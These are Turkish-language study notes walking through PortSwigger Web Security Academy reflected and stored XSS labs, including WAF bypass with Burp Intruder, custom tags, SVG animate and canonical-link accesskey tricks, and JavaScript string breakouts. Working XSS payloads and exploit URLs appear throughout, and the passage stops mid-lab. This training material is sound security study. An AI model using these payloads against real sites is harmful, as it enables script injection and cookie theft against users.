Web uygulamalarını ve filtreleri test etmekte yardımcı olması için kapsamlı bir XSS [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) (hile sayfası) oluşturduk. Bu sayfada olaylara (events) ve etiketlere (tags) göre filtreleme yapabilir, hangi XSS vektörlerinin kullanıcı etkileşimi gerektirdiğini görebilirsiniz. Cheat sheet aynı zamanda AngularJS sandbox kaçışları gibi birçok bölümü de içeriyor ve XSS araştırmalarında size yardımcı olacak şekilde tasarlanmıştır.


# HTML tagları arasında XSS

XSS context'i HTML tag'leri arasındaki text olduğunda, JavaScript'in yürütülmesini tetiklemek için tasarlanmış bazı yeni HTML tag'lerini tanıtmanız gerekir.

JavaScript çalıştırmanın bazı yararlı yolları şunlardır:

```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

---

# Lab: Çoğu tag ve attribute engellendiği HTML context'inde  reflected XSS saldırısı

Bu laboratuvar, search fonksiyonunda reflected XSS güvenlik açığı içerir ancak yaygın XSS vektörlerine karşı koruma sağlamak için bir web uygulaması güvenlik duvarı (WAF) kullanır.

Laboratuvarı çözmek için, WAF'ı baypas eden ve `print()` fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin.

1- Aşağıdaki gibi standart bir XSS vektörü enjekte edin:

```
<img src=1 onerror=print()>
```

![Pasted image 20250420132451.png](/img/user/resimler/Pasted%20image%2020250420132451.png)

2-Bunun engellendiğini gözlemleyin. Sonraki birkaç adımda, hangi tag ve attribute'lerin engellendiğini test etmek için Burp Intruder'ı kullanacağız.

3- Burp'ün tarayıcısını açın ve laboratuvardaki search fonksiyonunu kullanın. Ortaya çıkan isteği Burp Intruder'a gönderin.

4- Burp Intruder'da, arama teriminin değerini şu şekilde değiştirin: `<>`

![Pasted image 20250420132613.png](/img/user/resimler/Pasted%20image%2020250420132613.png)

5- İmleci köşeli parantezlerin arasına getirin ve bir payload pozisyonu oluşturmak için `Add §` (Ekle §) düğmesine tıklayın. search teriminin değeri şimdi aşağıdaki gibi görünmelidir: `<§§>`

![Pasted image 20250420133023.png](/img/user/resimler/Pasted%20image%2020250420133023.png)

6- [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)'i ziyaret edin ve Copy tags to clipboard (Etiketleri panoya kopyala) seçeneğine tıklayın.

![Pasted image 20250420132734.png](/img/user/resimler/Pasted%20image%2020250420132734.png)

7- Payloads side panelinde, Payload yapılandırması altında, tag listesini payloads listesine yapıştırmak için Yapıştır'a tıklayın. Saldırıyı başlat'a tıklayın.

![Pasted image 20250420132841.png](/img/user/resimler/Pasted%20image%2020250420132841.png)

8- Saldırı tamamlandığında sonuçları gözden geçirin. Çoğu payload'un `400` response'a neden olduğunu, ancak `body` payload'unun `200` response'a neden olduğunu unutmayın.

![Pasted image 20250420133011.png](/img/user/resimler/Pasted%20image%2020250420133011.png)

9- Burp Intruder'a geri dönün ve search teriminizi şu şekilde değiştirin:

```
<body%20=1>
```

10 - `=` karakterinden önce imleci yerleştirin ve bir payload konumu oluşturmak için **`Add §`** düğmesine tıklayın. Search teriminin değeri artık şu şekilde görünmelidir:  

`<body%20§§=1>`

![Pasted image 20250420133333.png](/img/user/resimler/Pasted%20image%2020250420133333.png)

11 - [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) ziyaret edin ve `Copy events to clipboard` (Olayları panoya kopyala) seçeneğine tıklayın.

![Pasted image 20250420133131.png](/img/user/resimler/Pasted%20image%2020250420133131.png)

12- Payloads  yan panelinde, Payload configuration altında, önceki payloadları kaldırmak için Clear  öğesine tıklayın. Ardından attribute'lar listesini payloads listesine yapıştırmak için Paste'e tıklayın. Saldırıyı başlat'a tıklayın.

13- Saldırı tamamlandığında sonuçları gözden geçirin. Çoğu payload'un `400` response'a neden olduğunu, ancak `onresize` payload'unun `200` response'a neden olduğunu unutmayın.

![Pasted image 20250420133353.png](/img/user/resimler/Pasted%20image%2020250420133353.png)

14- Exploit sunucusuna gidin ve aşağıdaki kodu `YOUR-LAB-ID` yerine laboratuvar kimliğinizi yazarak yapıştırın:

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

![Pasted image 20250420133440.png](/img/user/resimler/Pasted%20image%2020250420133440.png)

15- **Store and Deliver exploit to victim** seçeneğine tıklayın.

---

# Lab: Tüm tagların engellendiği ancak özel (custom) tagların izin verildiği HTML contex'inden Reflected XSS

Bu laboratuvar, custom olanlar hariç tüm HTML tag'lerini engeller.

Laboratuvarı çözmek için, özel bir tag enjekte eden ve `document.cookie` dosyasını otomatik olarak uyaran bir cross-site scripting saldırısı gerçekleştirin.

1- Exploit sunucusuna gidin ve aşağıdaki kodu `YOUR-LAB-ID` yerine laboratuvar kimliğinizi yazarak yapıştırın:

```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

2- “ `Store`” ve “`Deliver exploit to victim`” seçeneklerine tıklayın.

Bu enjeksiyon, `alert` fonksiyonunu tetikleyen bir `onfocus` event handler içeren `x` ID'li özel bir tag oluşturur. URL'nin sonundaki hash, sayfa yüklenir yüklenmez bu elemente odaklanır ve `alert` payload'unun çağrılmasına neden olur.

* HTML, önceden tanımlanmış standart taglar ile gelir. Ama aynı zamanda kendi özel HTML taglarınızı de tanımlayabilirsiniz, bunlara **custom tags** denir.
* Örneğin `<h1>` gibi basit bir HTML tagı bile kullansak, sonuç aynı: WAF request'i engelliyor.
* HTML'de özel taglar genellikle bir tire (`-`) içerir. Örneğin:

```
<custom-tag>
```

Örnek olarak şöyle bir payload hazırlıyoruz:

```
<custom-tag onmouseover="alert('XSS')">
```

Tag'ı kapatıp search yaptığımızda, sayfada farenin üzerine geldiğimizde alert kutusu çıkıyor.

![Pasted image 20250420191702.png](/img/user/resimler/Pasted%20image%2020250420191702.png)

Şu anda elimizde çalışan bir XSS URL’i var. Ancak bu saldırı sadece kullanıcı fareyle öğenin üzerine gelirse tetikleniyor.

Şimdi saldırımızı otomatik hale getireceğiz.  

`onmouseover` yerine `onfocus` kullanacağız ve `alert(document.cookie)` yazacağız.  
Ama sadece bu yeterli değil çünkü `onfocus` eventi yalnızca **odaklanabilir (focusable)** elementlerde çalışır.

HTML’de bazı öğeler `tab` tuşuyla dolaşılabilir (tabable) ve odaklanabilir.  

Ama her HTML element'i bu özelliğe sahip değildir.  

Burada devreye `tabindex` özelliği girer. Eğer bir öğeye `tabindex="1"` verirsek, bu öğe **focus** alabilir hale gelir.

Yani özel tag'ımızı şöyle güncelliyoruz:

```
<custom-tag id="x" onfocus="alert(document.cookie)" tabindex="1">
```

Arama yaptığımızda bu tag DOM’a başarıyla ekleniyor. Artık sayfa yüklendiğinde ve element focus aldığında, cookie bilgileri alert ile gösteriliyor.

Son adımda, bu focus olayını otomatikleştirmek için URL'nin sonuna `#x` ekliyoruz:

```
https://example.com/search?query=...#x
```

Bu şekilde, sayfa yüklendiğinde otomatik olarak `id="x"` olan element'e yönlenilir ve `onfocus` event'i tetiklenir.

```
<custom-tag id=x onfocus=alert(document.cookie) tabindex=1>
```

Ve bunu URL'nin sonuna `#x` ekleyerek kullan:

```
https://example.com/search?query=<custom-tag id=x onfocus=alert(document.cookie) tabindex=1>#x
```

End Payload:  

```
<script>location='https://0a620023048a83848060766b002b000d.web-security-academy.net/?search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';</script>
```

----
# Laboratuvar: Event Handlers ve href attribute ile reflected XSS blocked

Bu laboratuvar, bazı whitelisted tag'lerle reflected bir XSS açığı içerir, ancak tüm event'ler ve anchor href attribute'leri engellenmiştir.

Laboratuvarı çözmek için, tıklandığında alert fonksiyonunu çağıran bir vektör enjekte eden bir cross-site scripting saldırısı gerçekleştirin.

Saldırı vektörünüze tıklamayı teşvik etmek için 'Click' kelimesini içeren bir tag kullanmanız gerektiğini unutmayın. Örneğin:

```
<a href="">Click me</a>
```

1- `YOUR-LAB-ID` yerine laboratuvar kimliğinizi yazarak aşağıdaki URL'yi ziyaret edin:

```
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E

https://YOUR-LAB-ID.web-security-academy.net/?search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>
```


* Search alanı bazı HTML taglarını engelliyor. Örneğin `<h1>` tagı denediğimizde JSON cevap olarak `"tag is not allowed"` mesajı dönüyor.

![Pasted image 20250420193651.png](/img/user/resimler/Pasted%20image%2020250420193651.png)

* Bu engelleme **web uygulama güvenlik duvarı (WAF)** tarafından yapılıyor.

Ancak bazı taglar WAF tarafından engellenmiyor.  
Örneğin sadece `<a>click me</a>` yazarsak ve bunu aratırsak, “click me” sayfaya render ediliyor.

![Pasted image 20250420193739.png](/img/user/resimler/Pasted%20image%2020250420193739.png)

Üzerine gelince altı çiziliyor, yani gerçekten bir bağlantı gibi davranıyor.

Not : Tag'ın DOM'a yerleştirildiği ve çalıştığı, `Inspect Element` üzerinden de doğrulanabilir.

```js
<a href="javascript:alert(123)">click me</a>
```

Ama bunu denediğimizde WAF engelliyor çünkü `href` attribute'una izin verilmiyor.

Peki neleri kullanabiliyoruz? `<a>` etiketi tamam. Diğerlerine bakalım.

Burp Suite kullanacağız. PortSwigger'ın XSS Payload Cheat Sheet’inden tag listemizi kopyalıyoruz.

Arama isteğini Burp Intruder’a gönderiyoruz.  İçeriği iki payload marker (`§`) içine alarak değiştiriyoruz.

Anchor tag’in (`<a>`) zaten 200 döneceğini biliyoruz. Amacımız başka hangi tagların 200 döndüğünü bulmak.

Bazı tag'ların hata döndürse de, `<a>` ve `<animate>` tagları 200 yanıtı alıyor.  
`<animate>` bir SVG elementi. Bu da SVG taglarının muhtemelen izinli olduğunu gösteriyor.

```
<svg><a>click me</a></svg>
```

Ama sayfada “click me” gözükmüyor çünkü SVG içinde **text** öğesi olmadan metin render edilmiyor.

```
<svg><a><text>click me</text></a></svg>
```

SVG içindeki metin, HTML'den farklı olarak sadece `<text>` elementiyle görüntülenebilir. Bu küçük detay XSS bypass'larında önemli rol oynayabilir.

```
<svg>
  <a>
    <text>click me</text>
  </a>
</svg>
```

Şimdi hedefimiz, kullanıcı bu bağlantıya tıkladığında `alert(1)` gibi bir JavaScript fonksiyonu çalıştırmak. HTML'deki klasik `href="javascript:..."` yaklaşımı burada doğrudan yasaklandığı için SVG içindeki farklı yolları deniyoruz.

SVG içerisinde `<a>` etiketi `xlink:href` attribute'u kullanır. Ve bu attribute sayesinde tıklanabilir bir bağlantı oluşturulabilir.

Ancak burada kritik nokta şu: `xlink:href="javascript:alert(1)"` tarzı kullanım bazı tarayıcılarda (özellikle modern olanlarda) çalışmayabilir çünkü `javascript:` protokolü güvenlik nedeniyle engellenmiş olabilir.

Fakat bu lab ortamı özel olarak böyle bir vektöre izin veriyor olabilir.

```
<svg>
  <a xlink:href="javascript:alert(1)">
    <text>click me</text>
  </a>
</svg>
```

Bu payload, `alert(1)` fonksiyonunu çağırmak üzere yapılandırılmıştır. Aynı zamanda:

- SVG etiketi kullanıldığı için filtrelenmiyor.
- `<a>` etiketi de SVG içi kullanıma uygun.
- `text` etiketi sayesinde içerik sayfada görünür oluyor.
- Ve içinde "click" kelimesi geçtiği için simülasyon bu bağlantıya tıklıyor.


Bu payload’ı arama kutusuna yapıştırıp "Search" tuşuna bastığınızda:

- Sayfaya bir "click me" bağlantısı render edilir.
- Lab ortamı otomatik olarak bağlantıya tıklayarak `alert(1)` fonksiyonunu tetikler.
- Böylece lab başarılı şekilde tamamlanır.

```
<svg><a><animate attributeName=href values=javascript:alert(1)/><text x=20 y=20>Click me</text></a>

<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Clickme</text></a>
```

![Pasted image 20250420194902.png](/img/user/resimler/Pasted%20image%2020250420194902.png)

![Pasted image 20250420194908.png](/img/user/resimler/Pasted%20image%2020250420194908.png)

---

## Laboratuvar: Bazı SVG biçimlendirmelerine izin verilen Reflected XSS

Bu laboratuvarda basit bir reflected XSS güvenlik açığı var. Site genel tag'leri engellemekte ancak bazı SVG tag'lerini ve event'lerini kaçırmaktadır.

Laboratuvarı çözmek için alert() fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin.

Çözüm : 

1- Aşağıdaki gibi standart bir XSS payload'ı enjekte edin:

```
<img src=1 onerror=alert(1)>
```

2- Bu payload'un engellendiğini gözlemleyin. Sonraki birkaç adımda, hangi tag ve attribute'lerin engellendiğini test etmek için Burp Intruder'ı kullanacağız.

![Pasted image 20250422125314.png](/img/user/resimler/Pasted%20image%2020250422125314.png)

3- Burp'ün tarayıcısını açın ve laboratuvardaki search fonksiyonunu kullanın. Ortaya çıkan isteği Burp Intruder'a gönderin.

4- Request template'de search term'in değerini şu şekilde değiştirin: `<>`

5- İmleci köşeli parantezlerin arasına getirin ve bir payload pozisyonu oluşturmak için `Add §` düğmesine tıklayın. Search teriminin değeri şimdi şöyle olmalıdır: `<§§>`

6- [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)'i ziyaret edin ve ==Copy tags to clipboard== seçeneğine tıklayın.

![Pasted image 20250422125452.png](/img/user/resimler/Pasted%20image%2020250422125452.png)

7- Burp Intruder'da, Payloads yan panelinde, tag listesini payloads  listesine yapıştırmak için `Paste`'e (Yapıştır) tıklayın. Saldırıyı başlat'a tıklayın.

8- Saldırı tamamlandığında sonuçları gözden geçirin. `200` response'u alan `<svg>,` `<animatetransform>`, `<title>` ve `<image>` tag'lerini kullananlar hariç tüm payload'ların `400` response'una neden olduğunu gözlemleyin.

![Pasted image 20250422125559.png](/img/user/resimler/Pasted%20image%2020250422125559.png)

9- Intruder sekmesine geri dönün ve search teriminizi şu şekilde değiştirin:

```
<svg><animatetransform%20=1>
```

10- İmleci `=` karakterinden önce getirin ve bir payload pozisyonu oluşturmak için Add § (Ekle §) öğesine tıklayın. Search teriminin değeri şimdi şöyle olmalıdır:

```
<svg><animatetransform%20§§=1>
```

11- [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) sayfasını ziyaret edin ve ==Copy events to clipboard== seçeneğine tıklayın.

12- Burp Intruder'da, Payload yan panelinde, önceki payload'ları kaldırmak için Clear'a (Temizle) tıklayın. Ardından attribute listesini payloads listesine yapıştırmak için Paste'e tıklayın. Saldırıyı başlat'a tıklayın.

13- Saldırı tamamlandığında sonuçları gözden geçirin. Tüm payload'ların, `200` yanıtına neden olan `onbegin` payload'u dışında `400` yanıtına neden olduğuna dikkat edin.

![Pasted image 20250422125754.png](/img/user/resimler/Pasted%20image%2020250422125754.png)

14- `alert()` fonksiyonunun çağrıldığını ve laboratuvarın çözüldüğünü doğrulamak için tarayıcıda aşağıdaki URL'yi ziyaret edin:

```
https://0a5b0073031d9cbf800812cc0064003a.h1-web-security-academy.net//?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
```

```
"><svg><animatetransform onbegin=alert(1)>
```


---

## HTML tag attribute'lerinde XSS

XSS contex bir HTML tag attribute değeri içindeyse, bazen attribute değerini sonlandırabilir, tag'i kapatabilir ve yeni bir tane ekleyebilirsiniz. Örneğin:

```
"><script>alert(document.domain)</script>
```

Bu durumda daha yaygın olarak, köşeli parantezler engellenir veya kodlanır, böylece input'unuz göründüğü tag'in dışına çıkamaz. Attribute değerini sonlandırabilmeniz koşuluyla, normalde bir event handler gibi kodlanabilir bir context oluşturan yeni bir attribute ekleyebilirsiniz. Örneğin:

```
" autofocus onfocus=alert(document.domain) x="
```

Yukarıdaki payload, element odağı aldığında JavaScript'i çalıştıracak bir `onfocus` event'i oluşturur ve ayrıca herhangi bir kullanıcı etkileşimi olmadan `onfocus` event'ini otomatik olarak tetiklemeye çalışmak için `autofocus` attribute'ünü ekler. Son olarak, aşağıdaki işaretlemeyi zarif bir şekilde onarmak için `x="` ekler.

---

## Lab: HTML encoded açılı parantezlerle attribute'e Reflected XSS

Bu laboratuvar, açılı parantezlerin HTML ile kodlandığı search blogu fonksiyonunda reflected cross-site scripting güvenlik açığı içermektedir. Bu laboratuvarı çözmek için, bir attribute enjekte eden ve `alert` fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin.

1- Search kutusuna rastgele bir alfanümerik string gönderin, ardından Search Request'i kesmek ve Burp Repeater'a göndermek için Burp Suite'i kullanın.

2 - Rastgele stringin tırnak içine alınmış bir attribute içinde yansıtıldığına dikkat edin.

![Pasted image 20250422131132.png](/img/user/resimler/Pasted%20image%2020250422131132.png)

3- Aktarılan attribute'dan kaçmak ve bir event handler enjekte etmek için input'unuzu aşağıdaki payload ile değiştirin:

```
"onmouseover="alert(1)
```

![Pasted image 20250422131341.png](/img/user/resimler/Pasted%20image%2020250422131341.png)

4- Sağ tıklayıp “URL Kopyala ”yı seçerek ve URL'yi tarayıcıya yapıştırarak tekniğin işe yaradığını doğrulayın. Fareyi enjekte edilen elementin üzerine getirdiğinizde bir alert tetiklemelidir.

----

Bazen XSS contex'i, kendisi de script edilebilir bir contex oluşturabilen bir tür HTML Tag attribute'unun içinde yer alır. Burada, attribute değerini sonlandırmaya gerek kalmadan JavaScript çalıştırabilirsiniz. Örneğin, XSS context bir anchor tag'in `href` attribute'u içindeyse, script çalıştırmak için `javascript` pseudo-protocol'ünü kullanabilirsiniz. Örneğin:

```
<a href="javascript:alert(document.domain)">
```

----

## Lab: XSS'nin anchor href attribute içine çift tırnak HTML kodlu olarak depolanması

Bu laboratuvar, comment fonksiyonunda stored cross-site scripting güvenlik açığı içermektedir. Bu laboratuvarı çözmek için, yorum yazarının adına tıklandığında `alert` fonksiyonunu çağıran bir yorum gönderin.

Çözüm :

1- “Web Sitesi” girişine rastgele bir alfanümerik string içeren bir yorum gönderin, ardından request'i kesmek ve Burp Repeater'a göndermek için Burp Suite'i kullanın.

2- Gönderiyi görüntülemek için tarayıcıda ikinci bir request oluşturun ve bu request'i kesip Burp Repeater'a göndermek için Burp Suite'i kullanın.

![Pasted image 20250422200409.png](/img/user/resimler/Pasted%20image%2020250422200409.png)


3- İkinci Repeater sekmesindeki rastgele stringin bir anchor href attribute içinde yansıtıldığını gözlemleyin.

![Pasted image 20250422200435.png](/img/user/resimler/Pasted%20image%2020250422200435.png)

4- İşlemi tekrarlayın ancak bu kez alert'i çağıran bir JavaScript URL'si enjekte etmek için input'unuzu aşağıdaki payload ile değiştirin:

```
javascript:alert(1)
```

![Pasted image 20250422200513.png](/img/user/resimler/Pasted%20image%2020250422200513.png)

5- Sağ tıklayıp “URL'yi Kopyala ”yı seçerek ve URL'yi tarayıcıya yapıştırarak tekniğin işe yaradığını doğrulayın. Yorumunuzun üzerindeki isme tıkladığınızda bir alert tetiklenmelidir.

![Pasted image 20250422200535.png](/img/user/resimler/Pasted%20image%2020250422200535.png)

----

Köşeli parantezleri kodlayan ancak yine de attribute'ları enjekte etmenize izin veren web siteleriyle karşılaşabilirsiniz. Bazen bu enjeksiyonlar, canonical tag gibi genellikle event'leri otomatik olarak tetiklemeyen tag'ler içinde bile mümkündür. Chrome'da access key'leri ve user interaction'ı kullanarak bu davranıştan faydalanabilirsiniz. Access keys, belirli bir öğeye referans veren klavye kısayolları sağlamanıza olanak tanır. Accesskey attribute, diğer tuşlarla birlikte basıldığında (bunlar farklı platformlara göre değişir) event'lerin tetiklenmesine neden olacak bir harf tanımlamanıza olanak tanır. Bir sonraki laboratuvarda accesskey'leri deneyebilir ve bir canonical tag'den faydalanabilirsiniz. [PortSwigger Research tarafından icat edilen bir tekniği kullanarak gizlenmiş input alanlarında XSS'den yararlanabilirsiniz.](https://portswigger.net/research/xss-in-hidden-input-fields)

---

## Lab: Reflected XSS in canonical link tag

Bu laboratuvar, canonical link tag'indeki kullanıcı input'unu yansıtır ve Angle brackets'ı escapes eder.

Laboratuvarı çözmek için, `alert` fonksiyonunu çağıran bir attribute enjekte eden ana sayfada cross-site scripting saldırısı gerçekleştirin.

Saldırınıza yardımcı olması için, simüle edilen kullanıcının aşağıdaki tuş kombinasyonlarına basacağını varsayabilirsiniz:

- `ALT+SHIFT+X`
- `CTRL+ALT+X`
- `Alt+X`

Bu laboratuvarda amaçlanan çözümün yalnızca Chrome'da mümkün olduğunu lütfen unutmayın.

1- YOUR-LAB-ID yerine laboratuvar kimliğinizi yazarak aşağıdaki URL'yi ziyaret edin:

```
https://0a3100e604ce6064823ca70a00cb008a.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```

2- Bu, `X` tuşunu tüm sayfa için bir access key (erişim tuşu) olarak ayarlar. Bir kullanıcı access tuşuna bastığında, `alert` fonksiyonu çağrılır.

3- İstismarı kendi üzerinizde tetiklemek için aşağıdaki tuş kombinasyonlarından birine basın:

- On Windows: `ALT+SHIFT+X`
- On MacOS: `CTRL+ALT+X`
- On Linux: `Alt+X`

![Pasted image 20250422221744.png](/img/user/resimler/Pasted%20image%2020250422221744.png)

Özet : 

Kullanıcıya görünmeyen HTML taglarında (özellikle `<head>` içinde yer alan `<link rel="canonical">`) **Reflected XSS (yansıtmalı XSS)** açığının nasıl exploit edilebilir

* XSS sadece sayfada görünen alanlarda olmaz. Kullanıcıya görünmeyen `<head>` kısmında bile XSS zafiyeti olabilir.

* `rel="canonical"` tag'ı, tarayıcılarda görünmeyen ama HTML’in `<head>` bölümünde yer alan bir linktir.

* Bu `href` içine yerleştirilen URL parametresi sunucudan yansıtılıyorsa, burada XSS denenebilir.

#### Canonical Link Nedir?

`<link rel="canonical" href="URL">`  

* Bu tag, arama motorlarına "bu sayfanın orijinal ve tercih edilen URL'si budur" mesajını verir.  

* Örneğin, aynı içeriğe sahip ama farklı URL'lere sahip sayfalar varsa, arama motorlarının hangisini esas alması gerektiğini gösterir.


**Sayfada herhangi bir giriş alanı yok**, sadece URL’ye parametre ekleyerek XSS yapılabiliyor.

```
https://example.com/?test=zen
```

URL’ye yazılan veri doğrudan sayfa kaynağına (HTML response) yansıtılıyor:

```
<link rel="canonical" href='https://example.com/?test=zen'>
```

**Amaç:** `href` attribute'undan çıkıp yeni bir atrribute enjekte etmek.

```
?test=' onclick='alert(1)
```

Bu durumda HTML şöyle olur:

```
<link rel="canonical" href='https://example.com/?test=' onclick='alert(1)'>
```

Sorun: Bu `<link>` etiketi görünmüyor, tıklanamıyor

- Normalde bir `onclick` olayı kullanıcı tıklayınca çalışır.
- Ama `<link>` tag'ı `<head>` içinde ve görünmez, kullanıcı tıklayamaz.

Çözüm: **accesskey** kullanmak

- `accesskey`, bir HTML elementine kısayol tuşu atamanızı sağlar.
- Böylece kullanıcı görünmeyen bir elementi **klavye kısayolu ile tetikleyebilir**.
- Örnek payload:

```
?test=' accesskey='x' onclick='alert(1)
```

HTML şöyle olur:

```
<link rel="canonical" href='...' accesskey='x' onclick='alert(1)'>
```

Bu durumda tarayıcıda (örneğin Firefox’ta) **Alt + Shift + X** (ya da tarayıcıya göre değişir) yaptığınızda, `onclick` tetiklenir ve `alert(1)` çalışır.

----

## JavaScript'e XSS

XSS contex'i response içindeki mevcut bir JavaScript olduğunda, başarılı bir exploit gerçekleştirmek için farklı tekniklerin gerekli olduğu çok çeşitli durumlar ortaya çıkabilir.

#### Mevcut scriptin sonlandırılması

En basit durumda, mevcut JavaScript'i çevreleyen script tagını kapatmak ve JavaScript'in yürütülmesini tetikleyecek bazı yeni HTML tagları eklemek mümkündür. Örneğin, XSS context aşağıdaki gibi ise:

```
<script>
...
var input = 'controllable data here';
...
</script>
```

ardından mevcut JavaScript'ten çıkmak ve kendi JavaScript'inizi çalıştırmak için aşağıdaki payload'u kullanabilirsiniz:

```
</script><img src=1 onerror=alert(document.domain)>
```

Bunun işe yaramasının nedeni, tarayıcının önce kod blokları da dahil olmak üzere sayfa elementlerinin tanımlanması için HTML parsing işlemini gerçekleştirmesi ve ancak daha sonra gömülü scriptleri anlamak ve çalıştırmak için JavaScript parsing işlemini gerçekleştirmesidir. Yukarıdaki payload, orijinal script'i sonlandırılmamış bir string literal ile kırık bırakır. Ancak bu, sonraki script'in normal şekilde parse edilmesini ve çalıştırılmasını engellemez.

----

## Lab: Tek tırnak ve ters eğik çizgi karakterlerinin kaçış karakteriyle işlendiği bir JavaScript string'ine reflected XSS yerleştirme

Bu laboratuvar, search query tracking fonksiyonunda reflected cross-site scripting güvenlik açığı içermektedir. Refleksiyon, tek tırnak işaretleri ve ters eğik çizgileri atlanmış bir JavaScript stringi içinde gerçekleşir.

Bu laboratuvarı çözmek için JavaScript string'inden çıkan ve `alert` fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin.

1- Search box'a rastgele bir alfanümerik string gönderin, ardından search request'i kesmek ve Burp Repeater'a göndermek için Burp Suite'i kullanın.

2- Rastgele stringin bir JavaScript stringi içinde yansıtıldığını gözlemleyin.

3- `Test'payload` payload'unu göndermeyi deneyin ve tek tırnak işaretinizin backslash-escaped aldığını ve string'den çıkmanızı engellediğini gözlemleyin

![Pasted image 20250422225738.png](/img/user/resimler/Pasted%20image%2020250422225738.png)

4- Kod bloğundan çıkmak ve yeni bir kod enjekte etmek için input'unuzu aşağıdaki payload ile değiştirin:

```
</script><script>alert(1)</script>
```

![Pasted image 20250422225818.png](/img/user/resimler/Pasted%20image%2020250422225818.png)

![Pasted image 20250422225915.png](/img/user/resimler/Pasted%20image%2020250422225915.png)

![Pasted image 20250422225845.png](/img/user/resimler/Pasted%20image%2020250422225845.png)

5- Sağ tıklayıp “URL'yi Kopyala ”yı seçerek ve URL'yi tarayıcıya yapıştırarak tekniğin işe yaradığını doğrulayın. Sayfayı yüklediğinizde bir alert tetiklemelidir.

---

## JavaScript string'inden çıkma

XSS contex'inde tırnak içine alınmış bir string literal'in bulunduğu durumlarda, genellikle string'in dışına çıkmak ve JavaScript'i doğrudan çalıştırmak mümkündür. XSS context'i takip eden script'i onarmak çok önemlidir, çünkü buradaki herhangi bir syntax hatası tüm script'in çalışmasını engelleyecektir.

Bir string literalden çıkmanın bazı yararlı yolları şunlardır:

```
'-alert(document.domain)-'
';alert(document.domain)//
```

----

## Laboratuvar: HTML tag köşeli parantezleri kodlanmış şekilde, bir JavaScript string’ine reflected XSS zafiyeti yerleştirme

Bu laboratuvar, açılı parantezlerin kodlandığı search sorgusu tracking fonksiyonunda reflected cross-site scripting güvenlik açığı içermektedir. Refleksiyon bir JavaScript stringi içinde gerçekleşir. Bu laboratuvarı çözmek için JavaScript string'inden çıkan ve `alert` fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin.

1- Search box'a rastgele bir alfanümerik string gönderin, ardından Search Request'i kesmek ve Burp Repeater'a göndermek için Burp Suite'i kullanın.

![Pasted image 20250422231213.png](/img/user/resimler/Pasted%20image%2020250422231213.png)

2- Rastgele stringin bir JavaScript stringi içinde yansıtıldığını gözlemleyin.

3- JavaScript stringinden çıkmak ve bir `alert` enjekte etmek için inputunuzu aşağıdaki payload ile değiştirin:

```
'-alert(1)-'
```

![Pasted image 20250422231244.png](/img/user/resimler/Pasted%20image%2020250422231244.png)

![Pasted image 20250422231309.png](/img/user/resimler/Pasted%20image%2020250422231309.png)

4- Sağ tıklayıp “URL'yi Kopyala ”yı seçerek ve URL'yi tarayıcıya yapıştırarak tekniğin işe yaradığını doğrulayın. Sayfayı yüklediğinizde bir `alert` tetiklemelidir.

----

Bazı uygulamalar, herhangi bir tek tırnak karakterini ters eğik çizgi ile önleyerek inputun JavaScript stringinden ayrılmasını önlemeye çalışır. Bir karakterden önceki ters eğik çizgi, JavaScript parser'a karakterin string terminator gibi özel bir karakter olarak değil, tam anlamıyla yorumlanması gerektiğini söyler. Bu durumda, uygulamalar genellikle ters eğik çizgi karakterinin kendisinden kaçamama hatasına düşer. Bu, bir saldırganın uygulama tarafından eklenen ters eğik çizgiyi etkisiz hale getirmek için kendi ters eğik çizgi karakterini kullanabileceği anlamına gelir.

Örneğin, inoutun şu olduğunu varsayalım:

```
';alert(document.domain)//
```

dönüştürülür:

```
\';alert(document.domain)//
```

Artık alternatif payload'u kullanabilirsiniz:

```
\';alert(document.domain)//
```

'ye dönüştürülür:

```
\\';alert(document.domain)//
```

Burada, ilk ters eğik çizgi, ikinci ters eğik çizginin özel bir karakter olarak değil, tam anlamıyla yorumlanacağı anlamına gelir. Bu da tırnak işaretinin artık bir string sonlandırıcısı olarak yorumlanacağı anlamına gelir ve böylece saldırı başarılı olur.

---

## Lab: Köşeli parantezlerin (`<`, `>`) ve çift tırnakların (`"`) HTML kodlamasıyla işlendiği, tek tırnakların (`'`) ise kaçış karakteriyle işlendiği bir JavaScript string'ine reflected XSS yerleştirme.

Bu laboratuvar, search query tracking fonksiyonunda açılı parantezlerin ve çift tırnakların HTML kodlu olduğu ve tek tırnakların kaçtığı reflected bir cross-site scripting güvenlik açığı içermektedir.

Bu laboratuvarı çözmek için JavaScript stringinden ayrılan ve `alert` fonksiyonunu çağıran bir cross-site scripting saldırısı gerçekleştirin

1- Search box'a rastgele bir alfanümerik string gönderin, ardından Search Request'i kesmek ve Burp Repeater'a göndermek için Burp Suite'i kullanın.

2- Rastgele stringin bir JavaScript stringi içinde reflekte edildiğini gözlemleyin.

![Pasted image 20250422232611.png](/img/user/resimler/Pasted%20image%2020250422232611.png)

3- `Test'payload` payload'u göndermeyi deneyin ve tek tırnak işaretinizin ters eğik çizgi ile kesildiğini ve string'den çıkmanızı engellediğini gözlemleyin.

